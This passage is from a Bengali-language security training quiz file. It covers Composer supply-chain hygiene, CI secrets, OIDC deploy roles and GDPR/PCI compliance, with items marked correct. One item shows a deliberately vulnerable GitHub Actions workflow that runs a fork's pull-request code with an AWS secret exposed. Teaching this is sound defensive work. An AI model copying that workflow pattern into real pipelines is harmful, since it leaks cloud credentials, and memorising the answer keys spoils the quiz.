    ref: compliance-inputs
  - q: 'PCI DSS-এর পরিধি ছোট করার সবচেয়ে সহজ উপায় কী?'
    a: 'কার্ডের তথ্য নিজের সার্ভারে না আনা: payment provider-এর hosted form আর token ব্যবহার করা।'
    more: |
      যে সিস্টেম কার্ডের তথ্য ছোঁয়, সেটাই PCI নিয়মের আওতায়। তাই provider-এর form ব্যবহার করে সার্ভারে শুধু token নিলে আমাদের দায় অনেক কমে। CVV অনুমোদনের পর কখনোই জমা রাখা যায় না।
    ref: compliance-inputs

quiz:
  - q: 'নিচের CI স্ক্রিপ্টে কোন সমস্যাটা সবচেয়ে বড়?'
    lang: bash
    code: |
      composer update --no-interaction
      vendor/bin/phpunit
      ./deploy.sh
    hint: 'test-এ যা চলল আর deploy হল, তা কি একই কোড?'
    options:
      - text: '`update` সবচেয়ে নতুন ভার্সন টানে; test হওয়া কোড আর lock-এর কোড আলাদা হতে পারে, বিষাক্ত ভার্সনও আসতে পারে'
        correct: true
        why: 'CI-তে `composer install` আর তারপর `composer audit` দিন; `update` শুধু PR-এ।'
      - text: 'phpunit-এর আগে deploy চালানো উচিত'
        correct: false
        why: 'test আগে হওয়াই ঠিক; সমস্যাটা ভার্সন-নির্ধারণে।'
      - text: '--no-interaction বাদ দেওয়া উচিত'
        correct: false
        why: 'CI-তে interaction না থাকাই ভালো। সমস্যা অন্য জায়গায়।'
      - text: 'কোনো সমস্যা নেই; সবচেয়ে নতুন ভার্সন সবচেয়ে নিরাপদ'
        correct: false
        why: 'নতুন মানেই নিরাপদ নয়; supply chain আক্রমণ ঠিক নতুন ভার্সন দিয়েই আসে।'
    ref: lock-and-audit
  - q: 'কোনগুলো supply chain ঝুঁকি কমায়?'
    hint: 'কোনগুলো ভার্সন আটকায় বা জানা দুর্বলতা ধরে?'
    options:
      - text: 'composer.lock commit করা আর CI-তে `composer install`'
        correct: true
        why: 'প্রতিটা build ঠিক একই, যাচাই-করা ভার্সন ব্যবহার করে।'
      - text: 'প্রতি build-এ `composer audit --locked`'
        correct: true
        why: 'জানা দুর্বল package পেলে build ভাঙে, তাই জানা যায় সাথে সাথে।'
      - text: 'সব package-এর ভার্সন "*" দেওয়া, যাতে সবসময় নতুনটা আসে'
        correct: false
        why: 'এতে যেকোনো বিষাক্ত নতুন ভার্সন নিজে থেকে ঢোকে। ভার্সন আটকানোর উল্টো।'
      - text: 'বছরে একবার সব package একসাথে আপডেট করা'
        correct: false
        why: 'বিশাল আপডেটে কী ভাঙল বোঝা কঠিন, আর মাঝের এক বছর দুর্বলতা খোলা থাকে। ছোট ছোট ধাপে ভালো।'
    ref: lock-and-audit
  - q: 'দিনার deploy পাইপলাইনে দীর্ঘমেয়াদি AWS access key secret হিসেবে রাখা। সবচেয়ে ভালো উন্নতি কোনটা?'
    hint: 'চুরি গেলে key কতদিন কাজ করবে?'
    options:
      - text: 'OIDC দিয়ে প্রতি run-এ অস্থায়ী credential, শুধু main branch-এ, ছোট অধিকারের role দিয়ে'
        correct: true
        why: 'চুরি গেলেও কয়েক ঘণ্টায় অকেজো, আর সীমিত কাজ করতে পারে।'
      - text: 'Secret-এর নাম গোপন নামে বদলে দেওয়া'
        correct: false
        why: 'নাম গোপন রাখলে মানটা নিরাপদ হয় না।'
      - text: 'Key কোডে hardcode করে private repository-তে রাখা'
        correct: false
        why: 'আরও খারাপ: কোডের সবাই আর history-র সবকিছু key পায়।'
      - text: 'প্রতিটা PR-এ deploy চালানো, যাতে সবসময় যাচাই হয়'
        correct: false
        why: 'PR workflow বা সে যে কোড চালায় তা বদলাতে পারে, ফলে অপরীক্ষিত কোডের হাতে secret পড়ে। deploy শুধু যাচাই-করা branch-এ merge-এর পর।'
    ref: oidc-deploy
  - q: 'অচেনা এক লোক নাদিয়ার repo-তে fork থেকে PR খুলল। এই workflow দিয়ে সে কী করতে পারে?'
    lang: yaml
    code: |
      on: pull_request_target
      jobs:
        test:
          steps:
            - uses: actions/checkout@v4
              with:
                ref: ${{ github.event.pull_request.head.sha }}
            - run: composer install && vendor/bin/phpunit
              env:
                AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
    hint: 'job কার কোড চালাচ্ছে, আর চাবি কার হাতে?'
    options:
      - text: 'কিছুই না: GitHub fork-এর PR-কে কখনো secret দেয় না'
        correct: false
        why: 'এটা সাধারণ `pull_request`-এর ক্ষেত্রে সত্য। `pull_request_target` secret-সহ চলে।'
      - text: 'composer script বা test-এ এমন কোড বসানো, যা key নিজের সার্ভারে পাঠায়'
        correct: true
        why: 'job PR-এর কোড checkout করে চালায়, আর key তার পরিবেশেই রাখা।'
      - text: 'কিছুই না: কোড শুধু test হচ্ছে, deploy নয়'
        correct: false
        why: 'test মানেই কোড চালানো। চোরের জন্য চালানোই যথেষ্ট।'
      - text: 'শুধু repo-র public ফাইল পড়া'
        correct: false
        why: 'সে secret-সহ পরিবেশে কোড চালাতে পারে, যা এর চেয়ে অনেক খারাপ।'
    ref: ci-secrets
  - q: 'নিচের কোন নিয়ম কোন পরিস্থিতিতে প্রযোজ্য?'
    hint: 'কোন ডেটা ছুঁচ্ছেন, তা দেখুন।'
    options:
      - text: 'ইউরোপের গ্রাহকের ব্যক্তিগত তথ্য রাখলে GDPR'
        correct: true
        why: 'কোম্পানি যেখানেই হোক, EU-র মানুষের ডেটা ছুঁলে GDPR লাগে।'
      - text: 'কার্ডের তথ্য ছুঁলে বা প্রক্রিয়া করলে PCI DSS'
        correct: true
        why: 'কার্ড ছোঁয়া সিস্টেমই PCI-র আওতায়। না ছুঁলে পরিধি ছোট।'
      - text: 'B2B গ্রাহক সুরক্ষা প্রমাণ চাইলে SOC 2 রিপোর্ট'
        correct: true
        why: 'বড় কোম্পানি ক্রেতারা সাধারণত SOC 2 অডিট রিপোর্ট দেখতে চায়।'
      - text: 'স্কুলের হাজিরা অ্যাপে অবশ্যই HIPAA'
        correct: false
        why: 'HIPAA মার্কিন স্বাস্থ্য তথ্যের জন্য; হাজিরা অ্যাপে প্রযোজ্য নয়।'
    ref: compliance-inputs
  - q: 'GDPR অনুযায়ী একজন ব্যবহারকারী মুছে ফেলতে বলল, কিন্তু তার কেনাকাটার টাকার রেকর্ড আইনত ৫ বছর রাখতে হবে। কী করবেন?'
    hint: 'টাকার হিসাব আর ব্যক্তির পরিচয় আলাদা করা যায় কি?'
    options:
      - text: 'User সারি আর সব অর্ডার মুছে ফেলা'
        correct: false
        why: 'আইনি রেকর্ড মোছা যাবে না, আর foreign key-ও ভাঙবে।'
      - text: 'অনুরোধ অগ্রাহ্য করা, কারণ রেকর্ড রাখতে হবে'
        correct: false
        why: 'পরিচয়ের তথ্য মোছা যায়; পুরো অনুরোধ অগ্রাহ্য করা ভুল।'
      - text: 'নাম, ইমেইল, ফোন anonymize করা; টাকার রেকর্ড রাখা; ঘটনাটা audit log-এ লেখা'
        correct: true
